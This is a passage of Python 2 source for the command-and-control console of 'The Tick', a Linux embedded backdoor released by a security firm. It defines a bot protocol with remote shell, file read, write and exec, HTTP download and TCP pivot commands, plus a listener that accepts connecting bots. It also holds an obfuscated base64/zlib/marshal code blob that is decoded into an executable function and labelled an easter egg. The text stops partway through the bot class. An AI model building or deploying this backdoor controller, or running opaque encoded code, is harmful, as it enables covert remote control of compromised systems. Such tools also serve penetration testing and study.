#!/usr/bin/env python2
# -*- coding: utf8 -*-

"""
The Tick, a Linux embedded backdoor.

Released as open source by NCC Group Plc - http://www.nccgroup.com/
Developed by Mario Vilas, mario.vilas@nccgroup.com
http://www.github.com/nccgroup/thetick

See the LICENSE file for further details.
"""

##############################################################################
# Imports and other module initialization.

# This namespace is pretty cluttered so make sure
# "from tick import *" doesn't make too much of a mess.
__all__ = ["Listener", "Console", "BotError"]

# Standard imports...
import sys
import readline
import os
import os.path

# More standard imports...
from socket import *
from struct import *
from cmd import Cmd
from shlex import split
from threading import Thread, RLock
from traceback import print_exc
from uuid import UUID
from collections import OrderedDict
from argparse import ArgumentParser
from time import sleep
from functools import wraps
from multiprocessing import Process
from subprocess import check_output

# This is our first dependency and we check it now so
# we know if we can use colors to show errors later.
try:
    from colorama import *

    # Disable colors if requested.
    #
    # Note that we have do do this here rather than
    # when parsing the command line arguments, since
    # several error conditions would happen before that.
    # or even withing argparse itself.
    #
    # Unfortunately this also disables all the other nifty
    # console tricks we can do with ANSI escapes too. :(

    if "--no-color" in sys.argv:
        ANSI_ENABLED = False
        init(wrap = True, strip = True)
    else:
        ANSI_ENABLED = True
        init()

except ImportError:
    print "Missing dependency: colorama"
    print "  pip install colorama"
    exit(1)

# Adds support for colors to argparse. Very important, yes!
try:
    from argparse_color_formatter import ColorHelpFormatter
except ImportError:
    print "Missing dependency: " + Style.BRIGHT + Fore.RED + "argparse_color_formatter" + Style.RESET_ALL
    print Style.BRIGHT + Fore.BLUE + "  pip install argparse-color-formatter" + Style.RESET_ALL
    exit(1)

# ASCII art tables. Of course we need this, why do you ask?
try:
    from texttable import Texttable
except ImportError:
    print "Missing dependency: "+ Style.BRIGHT + Fore.RED + "texttable" + Style.RESET_ALL
    print Style.BRIGHT + Fore.BLUE + "  pip install texttable" + Style.RESET_ALL
    exit(1)

# Yeah it's not pythonic to use asserts like that,
# but an old dog don't learn new tricks, y'know.
# And also, to be fair, CPython's idea of "optimization"
# breaks too many things anyway, so let's prevent that too.
try:
    assert False
    print "Running with assertions disabled is a " + Style.BRIGHT + Fore.RED + "TERRIBLE IDEA" + Style.RESET_ALL,
    if ANSI_ENABLED:
        print " \xf0\x9f\x98\xa0"   # angry face emoji
    else:
        print
    print "Please don't do that ever again..."
    exit(1)
except AssertionError:
    pass

##############################################################################
# Some good old blobs. Nothing says "trust this code and run it" like blobs.

# Boring banner :(
BORING_BANNER = """
ICAbWzMybRtbMW3ilZTilabilZcbWzIybeKUrCDilKzilIzilIDilJAgIBtbMW3ilZTilabilZcb
WzIybeKUrOKUjOKUgOKUkOKUrOKUjOKUgBtbMG0KICAbWzMybRtbMW0g4pWRIBtbMjJt4pSc4pSA
4pSk4pSc4pSkICAgG1sxbSDilZEgG1syMm3ilILilIIgIOKUnOKUtOKUkBtbMG0KICAbWzMybRtb
MW0g4pWpIBtbMjJt4pS0IOKUtOKUlOKUgOKUmCAgG1sxbSDilakgG1syMm3ilLTilJTilIDilJji
lLQg4pS0G1swbQo=
""".decode("base64")

# Fun banner :)
FUN_BANNER = """
ChtbMzFtG1sxbeKWhOKWhOKWhOKWiOKWiOKWiOKWiOKWiBtbMjJt4paTIBtbMW3ilojilogbWzIy
beKWkSAbWzFt4paI4paIG1syMm0g4paTG1sxbeKWiOKWiOKWiOKWiOKWiCAgICDiloTiloTiloTi
lojilojilojilojilogbWzIybeKWkyAbWzFt4paI4paIG1syMm3ilpMgG1sxbeKWhOKWiOKWiOKW
iOKWiOKWhCAgIOKWiOKWiCDiloTilojiloAbWzIybQobWzIybeKWkyAgG1sxbeKWiOKWiBtbMjJt
4paSIOKWk+KWkuKWkxtbMW3ilojilogbWzIybeKWkSAbWzFt4paI4paIG1syMm3ilpLilpMbWzFt
4paIG1syMm0gICAbWzFt4paAG1syMm0gICAg4paTICAbWzFt4paI4paIG1syMm3ilpIg4paT4paS
4paTG1sxbeKWiOKWiBtbMjJt4paS4paSG1sxbeKWiOKWiOKWgCDiloDiloggICDilojilojiloTi
logbWzIybeKWkiAbWzIybQobWzIybeKWkiDilpMbWzFt4paI4paIG1syMm3ilpEg4paS4paR4paS
G1sxbeKWiOKWiOKWgOKWgOKWiOKWiBtbMjJt4paR4paSG1sxbeKWiOKWiOKWiBtbMjJtICAgICAg
4paSIOKWkxtbMW3ilojilogbWzIybeKWkSDilpLilpHilpIbWzFt4paI4paIG1syMm3ilpLilpIb
WzFt4paT4paIICAgIOKWhCDilpPilojilojilojiloQbWzIybeKWkSAbWzIybQobWzIybeKWkSDi
lpMbWzFt4paI4paIG1syMm3ilpMg4paRIOKWkRtbMW3ilpPilogbWzIybSDilpEbWzFt4paI4paI
G1syMm0g4paS4paTG1sxbeKWiCAg4paEG1syMm0gICAg4paRIOKWkxtbMW3ilojilogbWzIybeKW
kyDilpEg4paRG1sxbeKWiOKWiBtbMjJt4paR4paSG1sxbeKWk+KWk+KWhCDiloTilojilojilpLi
lpMbWzFt4paI4paIIOKWiOKWhCAbWzIybQobWzIybSAg4paS4paIG1sxbeKWiBtbMjJt4paSIOKW
kSDilpEbWzFt4paT4paI4paSG1syMm3ilpHilogbWzFt4paIG1syMm3ilpPilpHilpIbWzFt4paI
4paI4paI4paIG1syMm3ilpIgICAgIOKWkuKWiBtbMW3ilogbWzIybeKWkiDilpEg4paRG1sxbeKW
iOKWiBtbMjJt4paR4paSIBtbMW3ilpPilojilojilojiloAbWzIybSDilpHilpLilogbWzFt4paI
G1syMm3ilpIgG1sxbeKWiOKWhBtbMjJtChtbMjJtICDilpIg4paR4paRICAgIBtbMW3ilpIbWzIy
bSDilpHilpEbWzFt4paS4paR4paSG1syMm3ilpHilpEg4paS4paRIOKWkSAgICAg4paSIOKWkeKW
kSAgIOKWkRtbMW3ilpMbWzIybSAg4paRIOKWkeKWkiDilpIgIOKWkeKWkiDilpLilpIgG1sxbeKW
kxtbMjJt4paSG1syMm0KG1syMm0gICAg4paRICAgICDilpIg4paR4paS4paRIOKWkSDilpEg4paR
ICDilpEgICAgICAg4paRICAgICDilpIg4paRICDilpEgIOKWkiAgIOKWkSDilpHilpIg4paS4paR
G1syMm0KG1syMm0gIOKWkSAgICAgICAbWzJt4paRG1syMm0gIOKWkeKWkSDilpEgICAbWzJt4paR
G1syMm0gICAgICAgIOKWkSAgICAgICDilpIg4paR4paRICAgICAgICAbWzJt4paRG1syMm0g4paR
4paRIBtbMm3ilpEbWzIybSAbWzIybQobWzJtICAgICAgICAgIOKWkSAg4paRICDilpEgICDilpEg
IOKWkSAgICAgICAgICAgICDilpEgIBtbMjJt4paRG1sybSDilpEgICAgICDilpEgIOKWkSAgIBtb
MjJtChtbMm0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paRICAgICAg
ICAgICAgICAgG1syMm0KG1swbQ==
""".decode("base64")

# This is a cute Easter Egg for those of you who read the source code. ;)
# For the extra paranoid out there: you can just remove this blob, nothing
# will break. Make sure to wear your favorite tinfoil hat when you do it!
play = """
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
"""
try:
    import marshal, types, zlib
    play = play.decode("base64")
    play = zlib.decompress(play)
    play = marshal.loads(play)                      # I know many of you will
    play = types.FunctionType(play, globals(), "play")    # go "yikes" now xD
except Exception:
    del play        # no easter egg for you, sorry :(
    print_exc()
#del play   # uncomment to disable

##############################################################################
# Custom TCP protocol definitions and helper functions.

# Base command IDs per category.
BASE_CMD_SYSTEM         = 0x0000
BASE_CMD_FILE           = 0x0100
BASE_CMD_NET            = 0x0200

# No operation command.
CMD_NOP                 = 0xFFFF

# System commands.
CMD_SYSTEM_EXIT         = BASE_CMD_SYSTEM + 0
CMD_SYSTEM_FORK         = BASE_CMD_SYSTEM + 1
CMD_SYSTEM_SHELL        = BASE_CMD_SYSTEM + 2

# File I/O commands.
CMD_FILE_READ           = BASE_CMD_FILE + 0
CMD_FILE_WRITE          = BASE_CMD_FILE + 1
CMD_FILE_DELETE         = BASE_CMD_FILE + 2
CMD_FILE_EXEC           = BASE_CMD_FILE + 3
CMD_FILE_CHMOD          = BASE_CMD_FILE + 4

# Network commands.
CMD_HTTP_DOWNLOAD       = BASE_CMD_NET + 0
CMD_DNS_RESOLVE         = BASE_CMD_NET + 1
CMD_TCP_PIVOT           = BASE_CMD_NET + 2

# Response codes.
CMD_STATUS_OK      = 0x00
CMD_STATUS_ERROR   = 0xFF

# TCP pivot structure for IPv4.
# typedef struct              // (all values below in network byte order)
# {
#     uint32_t ip;            // IP address to connect to
#     uint16_t port;          // TCP port to connect to
#     uint16_t from_port;     // Optional TCP port to connect from
# } CMD_TCP_PIVOT_ARGS;
def build_pivot_struct(ip, port, from_port = 0):
    return inet_aton(ip) + pack("!HH", port, from_port)

# Command header.
# typedef struct
# {
#     uint16_t cmd_id;        // Command ID, one of the CMD_* constants
#     uint16_t cmd_len;       // Small data size, to be read in memory while parsing
#     uint32_t data_len;      // Big data size, to be read by command implementations
# } CMD_HEADER;

# Build the command header structure.
def build_command(cmd_id, cmd = "", data = ""):
    cmd_len = len(cmd)
    try:
        data_len = len(data)
    except TypeError:
        data_len = data
        data = ""
    return pack("!HHL", cmd_id, cmd_len, data_len) + cmd + data

# Response header.
# typedef struct
# {
#     uint8_t  status;        // Status code (OK or error)
#     uint32_t data_len;      // Big data size
# } RESP_HEADER;

# Get only the response header from the socket.
# Data following the header must be read separately.
def get_resp_header(sock):
    status = sock.recv(1)
    data_len = sock.recv(4)
    if status == "" or data_len == "":
        raise BotError("disconnected")
    status, data_len = unpack("!BL", status + data_len)
    if status == CMD_STATUS_ERROR:
        if data_len > 0:
            msg = recvall(sock, data_len)
            if len(msg) != data_len:
                raise BotError("disconnected")
        raise BotError(msg)
    return data_len

# Skip bytes coming from the bot we don't actually need to read.
def skip_bytes(sock, count):
    while count > 0:
        bytes = len(sock.recv(count))
        if bytes == 0:
            raise BotError("disconnected")
        count = count - bytes

# Get the response header and ignore the response data.
# We'll use this for commands that don't require a response;
# that way even if the bot sends data we don't expect, the
# protocol won't break. Future compatibility FTW :)
def get_resp_no_data(sock):
    data_len = get_resp_header(sock)
    skip_bytes(sock, data_len)

# Read a fixed size block of data from a socket.
# Caller must ensure to check for errors.
def recvall(sock, count):
    buffer = ""
    while len(buffer) < count:
        tmp = sock.recv(min(65536, count - len(buffer)))
        if not tmp:
            break
        buffer = buffer + tmp
    return buffer

# Get the response header and the data, all together.
# We'll use this only for responses we assume have a reasonable
# amount of response data. TODO: perhaps make sure this is
# the case somehow - not too worried about this anyway.
def get_resp_with_data(sock):
    data_len = get_resp_header(sock)
    data = recvall(sock, data_len)
    if len(data) != data_len:
        raise BotError("disconnected")
    return data

# Copy a fixed amount of bytes from one file descriptor to another.
# If the data runs out before the operation is over, we fail silently.
# TODO: it'd be best to handle this error case too, but we must review
# how to do it specifically for each case.
def copy_stream(src, dst, count):
    while count > 0:
        buffer = src.read(min(65536, count))
        if not buffer:
            break
        count = count - len(buffer)
        dst.write(buffer)

##############################################################################
# C&C server over a custom TCP protocol.

# This class is exported by the module so we can
# have C&C servers decoupled from the console UI.
# Well, in theory. One day. We'll see.
class Listener(Thread):
    "Listener C&C for The Tick bots."

    def __init__(self, callback, bind_addr = "0.0.0.0", port = 5555):

        # True when running, False when shutting down.
        self.alive = False

        # Callback to be invoked every time a new bot connects.
        # The callback will receive two arguments, the listener
        # itself and the bot that just connected.
        self.callback = callback

        # Bind address and port.
        self.bind_addr = bind_addr
        self.port = port

        # Listening socket.
        self.listen_sock = None

        # Ordered dictionary with the bots that connected.
        # It will become apparent why we're using an ordered dict
        # instead of a regular dict once you read the source code
        # to the Console class.
        self.bots = OrderedDict()

        # Call the parent class constructor.
        super(Listener, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # Context manager to ensure all the sockets are closed on exit.
    # The bind and listen code is here to make sure its use is mandatory.
    def __enter__(self):
        self.listen_sock = socket()
        self.listen_sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.listen_sock.bind((self.bind_addr, self.port))
        self.listen_sock.listen(5)
        return self

    # Context manager to ensure all the sockets are closed on exit,
    # the "running" flag is set to False, and the "bots" dictionary
    # is cleared.
    def __exit__(self, *args):
        self.alive = False
        try:
            self.listen_sock.shutdown(2)
        except Exception:
            pass
        try:
            self.listen_sock.close()
        except Exception:
            pass
        self.listen_sock = None
        for bot in self.bots.values():
            try:
                bot.sock.shutdown(2)
            except Exception:
                pass
            try:
                bot.sock.close()
            except Exception:
                pass
        self.bots.clear()

    # This method is invoked in a background thread.
    # It receives incoming bot connetions and invokes the callback.
    def run(self):

        # Sanity check.
        assert not self.alive

        # We are running now! Yay! \o/
        self.alive = True

        # Use the context manager to ensure all resources are freed.
        with self:

            # Loop until we are signaled to stop.
            while self.alive:
                try:

                    # Accept an incoming bot connection.
                    # This is a blocking call and the background
                    # thread will spend most of the time stuck here.
                    sock, from_addr = self.listen_sock.accept()
                    try:

                        # Uh-oh, someone asked us to stop, so quit now.
                        if not self.alive:
                            try:
                                sock.shutdown(2)
                            except Exception:
                                pass
                            try:
                                sock.close()
                            except Exception:
                                pass
                            break

                        # The first 16 bytes that come from the socket
                        # must be the bot UUID value. This value is
                        # generated randomly by the bot when starting up.
                        # It DOES NOT identify the target machine, but
                        # rather the bot instance, so multiple instances
                        # on the same machine will have different UUIDs.
                        uuid = recvall(sock, 16)
                        if len(uuid) != 16:
                            continue
                        uuid = str(UUID(bytes = uuid))

                        # Instance a Bot object for this new connection.
                        bot = Bot(sock, uuid, from_addr)

                        # Keep it in the ordered dictionary. This means
                        # the dictionary will remember the order in which
                        # the bots connected. This is useful for the Console
                        # class later on.
                        self.bots[uuid] = bot

                    # On error make sure to destroy the accepted socket.
                    except:
                        try:
                            sock.shutdown(2)
                        except Exception:
                            pass
                        try:
                            sock.close()
                        except Exception:
                            pass
                        raise

                    # Invoke the callback function to notify
                    # a new bot has connected to the C&C.
                    try:
                        self.callback(self, bot)
                    except Exception:
                        print_exc()

                # Print exceptions and continue running.
                # TODO maybe use the console notifications for this?
                except Exception:
                    print_exc()

    # The accept() call is a bit particular in Python,
    # we can't just close the socket and call it a day.
    # This resulted in stubborn listener threads who simply
    # refused to die... extreme measures had to be taken. ;)
    def kill(self):
        "Forcefully kill the background thread."

        # Trivial case.
        if not self.alive:
            return

        # Set the flag to false so the thread
        # knows we are asking it to quit.
        self.alive = False

        # Connect briefly to the listnening port.
        # This will "wake up" the thread stuck
        # in the blocking socket accept() call.
        s = socket()
        try:
            s.connect(("127.0.0.1", self.port))
        finally:
            s.close()

##############################################################################
# How to talk to connected bots.

# Class for all bot related exceptions.
class BotError(RuntimeError):
    "The Tick bot error message."

# This decorator will do some basic checks on bot actions.
# It also catches some error conditions such as the bot being disconnected
# or the user canceling the operation with Control+C.
def bot_action(method):
    @wraps(method)
    def wrapper(self, *args, **kwds):
        assert self.alive
        try:
            return method(self, *args, **kwds)
        except KeyboardInterrupt:
            self.alive = False
            try:
                self.sock.shutdown(2)
            except:
                pass
            try:
                self.sock.close()
            except:
                pass
            raise BotError("disconnected")
        except BotError, e:
            if str(e) == "disconnected":
                self.alive = False
            raise
    return wrapper

# This class is not exported because I don't see a real reason
# for a user of this module to manually instance Bot objects.
class Bot(object):
    "The Tick bot instance."

    def __init__(self, sock, uuid, from_addr):

        # True if we can send commands to this instance, False otherwise.
        # False could either mean the bot is dead or the socket is being
        # used for something else, since some commands reuse the C&C socket.
        self.alive = True

        # The C&C socket to talk to this bot.
        self.sock = sock

        # The UUID for this bot instance.
        # See Listener.run() for more details.
        self.uuid = uuid

        # IP address and remote port where the connection came from.
        #
        # The IP address may not be correct if the bot is behind a NAT.
        # You can run the file_exec command to figure out the real IP.
        # Use your imagination. ;)
        #
        # The port is not terribly useful right now, but when we add
        # support for having the bot listen on a port rather than
        # connect to us, this may come in handy.
        self.from_addr = from_addr

    # Useful for debugging.
    def __repr__(self):
        return "<Bot uuid=%s ip=%s port=%d connected=%s>" % (
            self.uuid, self.from_addr[0], self.from_addr[1],
            "yes" if self.alive else "no"
        )

    #
    # The remainder of this class are the supported commands.
    # The code is pretty straightforward so I did not comment it.
    #

    @bot_action
    def system_exit(self):
        self.sock.sendall( build_command(CMD_SYSTEM_EXIT) )
        get_resp_no_data(self.sock)
        self.alive = False

    @bot_action
    def system_fork(self):
        self.sock.sendall( build_command(CMD_SYSTEM_FORK) )
        return str( UUID( bytes = get_resp_with_data(self.sock) ) )

